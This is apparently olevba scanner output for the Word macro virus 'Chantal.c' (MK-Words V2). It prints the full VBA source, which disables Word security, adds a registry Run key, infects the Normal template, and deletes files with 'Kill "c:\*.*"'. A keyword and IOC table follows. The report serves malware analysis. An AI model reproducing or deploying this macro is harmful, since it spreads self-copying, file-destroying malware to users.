olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chantal.c-5a151804c72598dbad5bd75a2320cbe7a0206cda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chantal.c-5a151804c72598dbad5bd75a2320cbe7a0206cda - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

'MK-Words 2
'From the MKVG - The Lion City
On Error Resume Next
Application.ShowVisualBasicEditor = False
CommandBars("Tools").Controls("macro").Enabled = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
Options.VirusProtection = False
DisableAutoMacros = False
Options.ConfirmConversions = False
ScreeenUpdate = False
ToolsOptionsSave.AutoSave = False
ToolsOptionsSave.GlobalDotPrompt = False
F = FreeFile
Open "c:\windows\system\mkv2.vbs" For Output As #F
Print #F, "Set MKV = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #F, "MKV.Options.VirusProtection = False"
Print #F, "MKV.Options.SaveNormalPrompt = False"
Print #F, "MKV.Options.SaveNormalPrompt = False"
Print #F, "MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
Print #F, "MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\MKV4.vxd" & Chr(34) & ")"
Print #F, "MKV.Application.Quit"
Close #F

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MKV") = "C:\WINDOWS\SYSTEM\MKV2.vbs"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Welcome To Y2K", 0, "MK Words V2 By MKVG 1999"
If Day(Now) = 31 Then
Assistant.Visible = True
With Assistant.NewBalloon
    .Animation = msoAnimationListensToComputer
    .Button = msoButtonSetOK
    .Heading = "MK Words V.2"
    .Text = "Y2K is Coming Soon..."
    .Show
End With
End If

    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        ' Save it
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            ' Save It
            NormalTemplate.Save
    Else
        'If the normal and active are infected now activate the payload
    End If
  
Y2KEnd:
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V2) By MMK 1999"
            .Execute
        End With

' MKVG had present MK Words Version 2
' (C) May 1999
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mkv2.vbs            |Executable file name                         |
|IOC       |MKV2.vbs            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

